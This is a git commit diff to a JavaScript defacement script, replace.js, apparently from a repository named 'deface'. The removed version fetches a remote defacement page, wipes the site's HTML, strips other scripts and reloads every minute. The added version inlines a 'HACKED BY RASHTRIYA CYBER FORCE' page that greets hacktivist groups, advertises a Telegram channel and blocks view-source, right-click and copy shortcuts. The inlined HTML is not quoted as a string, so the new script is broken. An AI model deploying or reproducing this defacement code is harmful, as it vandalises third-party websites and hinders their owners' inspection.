25748abc0943559440d61ce63424ee2558bd3039
inferno11 <167117133+inferno11@users.noreply.github.com>
2024-07-14 10:01:14 +0530

    replace.js

--- replace.js
+++ replace.js
@@ -1,26 +1,224 @@
 <script>
 async function defacePage() {
 try {
-const url = 'https://raw.githubusercontent.com/inferno11/deface/main/index.html';
-const response = await fetch(url);
-if (!response.ok) {
-throw new Error('Network response was not ok');
+const yourHtmlContent = 
+<html>
+<html lang="tr">
+
+
+<head>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="keywords" content="Hacked,deface,website,blackhat,defacer,hack,mirror,f3tdinal,F3tdinal,f3tdinal Hacked,Hacked By F3tdinal,Hacked By f3tdinal,">
+    <title>INDIANS WERE HERE</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Iceberg&display=swap">
+    <link rel="icon" href="https://i.hizliresim.com/q5xc9ke.jpg" type="image/x-icon">
+<link rel="shortcut icon" href="https://i.hizliresim.com/q5xc9ke.jpg" type="image/x-icon">
+
+    
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: 'Iceberg', cursive;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            min-height: 100vh;
+            cursor: url('http://www.rw-designer.com/cursor-extern.php?id=4108'), auto;
+        }
+
+        h1, p {
+            margin-bottom: 20px;
+        }
+
+        .neon-circle {
+            width: 350px;
+            height: 350px;
+            background-color: rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 20px 5px rgba(255, 255, 255, 0.5);
+        }
+
+        .neon-circle img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        h1.neon-text {
+            color: #ff0000;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.70),
+                         0 0 20px rgba(255, 0, 0, 0.70),
+                         0 0 30px rgba(255, 0, 0, 0.70),
+                         0 0 40px #ff0000,
+                         0 0 70px #ff0000;
+        }
+
+        ::selection {
+            background-color: #ff0000;
+            color: white;
+        }
+
+        .footer {
+            margin-top: 300px;
+            font-size: 15px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+<meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/howler/2.0.3/howler.min.js"></script> <link rel="stylesheet" type="text/css" href="css/bootstrap.css"> <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css"> <link rel="stylesheet" type="text/css" href="css/style.css"> <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"> <link href="http://fonts.googleapis.com/css?family=Varela+Round" rel="stylesheet" type="text/css"> <script type="text/javascript" src="js/bootstrap.min.js"></script> <script type="text/javascript" src="js/jquery.js"></script> <script type="text/javascript" src="js/jquery-1.10.2.min.js.download"></script> <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script> <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> <style type="text/css"> @import url('https://fonts.googleapis.com/css?family=Nunito');@import url('https://fonts.googleapis.com/css?family=Poiret+One');body, html {height: 100%;background-repeat: no-repeat; /*background-image: linear-gradient(rgb(12, 97, 33),rgb(104, 145, 162));*/background:black;position: relative;}#particles-js{ width: 100%; height: 100%; background-size: cover; background-position: 50% 50%; position: fixed; top: 0px; z-index:1;}h1{font:1.5em Cinzel,serif;font-weight:400;letter-spacing:.35em;text-shadow:0 0 25px rgba(254,254,255,.85);width:70%} } footer { margin: 20%; }
+#a {
+onmousedown:stop;
+animation-name: rotate ;
+animation-duration: 5s;
+animation-play-state: running;
+animation-timing-function: linear;
+animation-iteration-count: infinite;
+opacity: 1.0;filter: alpha(opacity=50);} img:hover {opacity: 1.0;filter: alpha(opacity=100);}
+@keyframes rotate{
+10% {transform:rotateY(36deg)}
+20% {transform:rotateY(72deg)}
+30% {transform:rotateY(108deg)}
+40% {transform:rotateY(144deg)}
+50% {transform:rotateY(180deg)}
+60% {transform:rotateY(216deg)}
+70% {transform:rotateY(252deg)}
+80% {transform:rotateY(288deg)}
+90% {transform:rotateY(324deg)}
+100% {transform:rotateY(360deg)}
 }
-const htmlContent = await response.text();
-// Remove all the current HTML content
-document.documentElement.innerHTML = '';
-// Insert the fetched HTML content
-document.write(htmlContent);
-document.close();
-// Remove any other scripts on the page
-const currentScripts = document.getElementsByTagName('script');
-for (let i = 0; i < currentScripts.length; i++) {
-if (currentScripts[i].src !== this.src) {
-currentScripts[i].remove();
+</style>
+
+
+</head> <body><center>
+
+  
+
+</center> <div id="particles-js"><canvas class="particles-js-canvas-el" style="width: 100%; height: 100%;" width="1365" height="949"></canvas></div> <!--<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>--> <script type="text/javascript">$.getScript("https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js", function(){ particlesJS('particles-js', { "particles": { "number": { "value": 80, "density": { "enable": true, "value_area": 800 } }, "color": { "value": "#ffffff" }, "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000000" }, "polygon": { "nb_sides": 5 }, "image": { "width": 100, "height": 100 } }, "opacity": { "value": 0.5, "random": false, "anim": { "enable": false, "speed": 1, "opacity_min": 0.1, "sync": false } }, "size": { "value": 5, "random": true, "anim": { "enable": false, "speed": 40, "size_min": 0.1, "sync": false } }, "line_linked": { "enable": true, "distance": 150, "color": "#ffffff", "opacity": 0.4, "width": 1 }, "move": { "enable": true, "speed": 6, "direction": "none", "random": false, "straight": false, "out_mode": "out", "attract": { "enable": false, "rotateX": 600, "rotateY": 1200 } } }, "interactivity": { "detect_on": "canvas", "events": { "onhover": { "enable": true, "mode": "repulse" }, "onclick": { "enable": true, "mode": "push" }, "resize": true }, "modes": { "grab": { "distance": 400, "line_linked": { "opacity": 1 } }, "bubble": { "distance": 400, "size": 40, "duration": 2, "opacity": 8, "speed": 3 }, "repulse": { "distance": 200 }, "push": { "particles_nb": 4 }, "remove": { "particles_nb": 2 } } }, "retina_detect": true, "config_demo": { "hide_card": false, "background_color": "#b61924", "background_image": "", "background_position": "50% 50%", "background_repeat": "no-repeat", "background_size": "cover" } } );}); </script> <script> // This script and many more from// http://rainbow.arch.scriptmania.comif (document.getElementById){// Plenty of black gives a better sparkle effect.showerCol=new Array('#000000','#ff0000','#ffffff','#000000','#00ff00','#ff00ff','#ffffff','#ffa500','#000000','#fff000');launchCol=new Array('#ffff00','#ff00ff','#00ffff','#ffffff','#ff8000');runSpeed=70; //setTimeout speed.// *** DO NOT EDIT BELOW ***var yPos=200;var xPos=200;var explosionSize=200;var launchColour='#ffff80';var timer=null;var dims=8;var evn=360/14;firework=new Array();var ieType=(typeof window.innerWidth != 'number');var ieRef=((ieType) && (document.compatMode) && (document.compatMode.indexOf("CSS") != -1))?document.documentElement:document.body;thisStep=0;step=5;for (i=0; i < 14; i++){document.write(' <div id="sparks'+i+'" style="position:absolute;top:0px;left:0px;border-radius:50%;height:'+dims+'px;width:'+dims+';font-size:'+dims+';background-color:'+launchColour+'"> &lt;\/div&gt;'); firework=document.getElementById(&quot;sparks&quot;+i).style; } function winDims(){ winH=(ieType)?ieRef.clientHeight:window.innerHeight; winW=(ieType)?ieRef.clientWidth:window.innerWidth; bestFit=(winW &gt;= winH)?winH:winW; } winDims(); window.onresize=new Function(&quot;winDims()&quot;); function Reset(){ var dsy=(ieType)?ieRef.scrollTop:window.pageYOffset; thisStep=-1; launchColour = launchCol[Math.floor(Math.random()*launchCol.length)]; explosionSize=Math.round(100+Math.random()*(bestFit/4)); yPos = explosionSize+Math.round(Math.random()*(winH-(explosionSize*2.2)))+dsy; xPos = explosionSize+Math.round(Math.random()*(winW-(explosionSize*2.2))); for (i=0; i &lt; 14; i++){ firework.backgroundColor=launchColour; firework.width=dims+&quot;px&quot;; firework.height=dims+&quot;px&quot;; firework.fontSize=dims+&quot;px&quot;; } Fireworks(); } function Fireworks(){ thisStep+=step; timer=setTimeout(&quot;Fireworks()&quot;,runSpeed); for (i=0; i &lt; 14; i++){ firework.top = yPos + explosionSize * Math.sin(i*evn*Math.PI/180)*Math.sin(thisStep/100)+&quot;px&quot;; firework.left= xPos + explosionSize * Math.cos(i*evn*Math.PI/180)*Math.sin(thisStep/100)+&quot;px&quot;; if (thisStep &gt; 100){ var dims_change=(explosionSize &lt; 150)?dims:Math.round(dims+Math.random()*2); firework.backgroundColor=showerCol[Math.floor(Math.random()*showerCol.length)]; firework.width=dims_change+&quot;px&quot;; firework.height=dims_change+&quot;px&quot;; firework.fontSize=dims_change+&quot;px&quot;; } } if (thisStep &gt; 140){ clearTimeout(timer); Reset(); } } window.onload=Fireworks; } </div> </script></b></b><div align="center" class="a"><font color="white"></font></div><font color="white"><br><div align="center"></div><br> </font></body></html>
+
+
+
+
+
+    <div class="neon-circle">
+        <img src="https://i.hizliresim.com/q5xc9ke.jpg" alt="RashtriyaCyberForce">
+    </div>
+    <h1 class="neon-text">HACKED BY RASHTRIYA CYBER FORCE </h1>
+    
+    <p class="neon-text"> We Are Legion! </p>
+    
+    <marquee behavior="scroll" direction="left" scrollamount="90" scrolldelay="40" width="100%">
+        <br>
+        <font color="red" size="10">___________________________________________________________</font>
+       </marquee>
+       <div style="text-shadow: 0px 0px 10px white;">
+        <span style="color: red;"> <font face="transformers" size="4"><b>Greetzs To : </b></font><b> </b></span>
+        <b>
+         <marquee scrollamount="5" direction="left" width="70%">
+          <font face="Play" color="Green" class="cn"> RashtriyaCyberForce |Professor | Root | Zibra |Network_Nine | Indian_Cyber_Punk | Team UCC | DarkCyberWarriors | Team NWH | Kerala Cyber Xtractors |Hacktivist Vanguard | <font color="cyan"><font color="lime"></font><font color="cyan">|</font> </font> LapsusIndia            <font color="cyan">
+         </marquee> </b>
+    
+        <p><font color="white"> " Hey Admin Your Website Has Been Hacked By Indian Hackers Just To Inform You That , Your Website Has security Crisis , Secure It as Soon as possible  , So That No Other Can Hack It Again with bad intentions.</font></p>
+        
+        <p><font color="white"> “ Improve The Security As Soon As Possible !!" </font></p>
+        
+                    <p><font color="white"> “"  Team RashtriyaCyber Force is Defending Indian CyberSpace. !!</p>
+        
+    <div class="footer">&copy;t.me/indian_rcf</div>
+
+    <audio id="lagu" src="https://pagaliworld.com/files/download/id/6936"></audio>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var audio = document.getElementById("lagu");
+
+
+            document.addEventListener("touchstart", playAudio);
+            document.addEventListener("click", playAudio);
+
+            function playAudio() {
+                audio.play();
+                
+                document.removeEventListener("touchstart", playAudio);
+                document.removeEventListener("click", playAudio);
+            }
+        });
+        
+        
+      
+        
+        document.onkeydown = function(e) {
+    if (e.keyCode == 123) {
+        return false;
+    }
 }
-}
-// Reload the defaced page every minute
-setInterval(defacePage, 60000);
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+});
+
+document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.key === 'a') {
+        e.preventDefault();
+    }
+});
+
+
+document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.key === 'v') {
+        e.preventDefault();
+    }
+});
+
+
+document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.key === 'x') {
+        e.preventDefault();
+    }
+});
+
+document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.key === 'c') {
+        e.preventDefault();
+    }
+});
+
+document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.key === 'u') {
+        e.preventDefault();
+    }
+});
+  </script>
+</body>
+</html>
+<html>
+  <head>
+    <style>
+      body {
+        background-image: url('https://i.hizliresim.com/rx0vfqs.jpg');
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+        background-size: cover;
+      }
+    </style>
+  </head>
+  <body>
+    <h2> "RASHTRIYACYBER FORCE!!!!" </h2>
+  </body>
+</html>
+
+;
+document.documentElement.innerHTML = yourHtmlContent;
 } catch (error) {
 console.error('Error fetching the HTML content:', error);
 }
